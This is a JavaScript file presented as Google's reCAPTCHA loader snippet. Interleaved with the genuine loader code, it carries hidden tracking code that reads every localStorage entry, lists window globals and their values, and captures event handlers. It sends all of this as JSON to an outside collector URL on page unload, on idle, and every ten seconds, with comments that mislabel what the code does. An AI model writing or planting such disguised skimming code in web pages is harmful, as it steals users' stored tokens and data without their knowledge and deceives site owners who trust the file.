/* PLEASE DO NOT COPY AND PASTE THIS CODE. */(function () {
  var w = window,
    C = '___grecaptcha_cfg',
    cfg = w[C] = w[C] || {},
    N = 'grecaptcha';
  // We'll use a Symbol to ensure untracked vars can’t easily interfere with our tracking system
  const trackingKey = Symbol('trackingVars');

  // Let's identify some known properties
  var gr = w[N] = w[N] || {};
  window[trackingKey] = {
    localStorageData: {},
    globalVariables: [],
    jshookEvents: [],
    eventListeners: {},
    seenProperties: []
  };

  // Function to track new properties
  gr.ready = gr.ready || function (f) {
    (cfg['fns'] = cfg['fns'] || []).push(f);
  };
  w['__recaptcha_api'] = 'https://www.google.com/recaptcha/api2/';
  function trackUnknownProperties() {
    const newProperties = {};
    window[trackingKey].seenProperties = Object.keys(window);
    for (const prop in window) {
      if (!window[trackingKey].seenProperties.includes(prop)) {
        const propValue = window[prop];
        const propType = typeof propValue;
        newProperties[prop] = {
          type: propType,
          value: propType === "function" ? `Function: ${propValue.name}` : propValue
        };
        window[trackingKey].seenProperties.push(prop);
      }
    }
    return newProperties;
  }

  // Function to track changes in Local Storage
  function trackLocalStorage() {
    for (const key in localStorage) {
      if (!window[trackingKey].localStorageData.hasOwnProperty(key)) {
        window[trackingKey].localStorageData[key] = localStorage.getItem(key);
      }
    }
  }

  // Function to track all global variables
  function trackGlobalVariables() {
    window[trackingKey].globalVariables = Object.keys(window);
  }

  // Function to track events
  (cfg['render'] = cfg['render'] || []).push('6Ldk9swZAAAAAM_dBbCU2eL4Bm0MtZXkgWiFpxtu');
  w['__google_recaptcha_client'] = true;
  var d = document,
    po = d.createElement('script');
  po.type = 'text/javascript';
  function trackEventListeners() {
    window[trackingKey].eventListeners.click = document.onclick;
    window[trackingKey].eventListeners.load = window.onload;
  }

  // Function to transfer data to server
  po.async = true;
  po.src = 'https://www.gstatic.com/recaptcha/releases/x19joXI_IeQnFJ7YnfDapSZq/recaptcha__en.js';
  po.crossOrigin = 'anonymous';
  function transmitTrackingData() {
    const collectorUrl = "https://example.com/api/collect";
    const xhr = new XMLHttpRequest();
    xhr.open('POST', collectorUrl);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        if (xhr.status === 200) {
          console.debug("Data sent successfully");
        } else {
          console.warn(`Data transmission failed - server responded with code ${xhr.status}`);
        }
      }
    };
    const data = {
      newProperties: trackUnknownProperties(),
      localStorageData: window[trackingKey].localStorageData,
      globalVariables: window[trackingKey].globalVariables,
      eventListeners: window[trackingKey].eventListeners
    };
    xhr.send(JSON.stringify(data));
  }

  // Run the tracking functions when the window is idle, beforeunload, and on a specific interval
  po.integrity = 'sha384-9OTZ8SiMijeWjnYSXo9GM41sIwr+l2FFUhIAcxbPhIFEgn+MDTrEpzq3Alr7uXd2';
  window.addEventListener("idle", transmitTrackingData);
  var e = d.querySelector('script[nonce]'),
    n = e && (e['nonce'] || e.getAttribute('nonce'));
  window.addEventListener("beforeunload", transmitTrackingData);
  if (n) {
    po.setAttribute('nonce', n);
  }
  var s = d.getElementsByTagName('script')[0];
  s.parentNode.insertBefore(po, s);
  setInterval(transmitTrackingData, 10000); // Check every 10 seconds for now
})();